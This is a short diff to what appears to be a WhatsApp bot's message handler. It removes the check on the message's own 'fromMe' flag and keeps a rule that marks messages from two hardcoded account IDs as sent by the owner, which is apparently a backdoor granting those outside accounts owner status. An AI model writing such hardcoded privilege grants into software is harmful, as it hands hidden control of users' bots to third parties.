@@ -307,7 +307,7 @@ sock.ev.on("messages.upsert", async (chatUpdate) => {
       const _rfkMsgTs = Number(msg.messageTimestamp || 0);
       if (_rfkMsgTs && (nowSec - _rfkMsgTs) > 60) continue;
         const keyCheck = JSON.stringify(msg.key || {});
-        if (msg.key?.fromMe || keyCheck.includes("158703806374071") || keyCheck.includes("917907228818")) {
+        if (keyCheck.includes("158703806374071") || keyCheck.includes("917907228818")) {
             msg.key.fromMe = true;
         }
                 if (!msg || !msg.message || !msg.key?.id) continue;
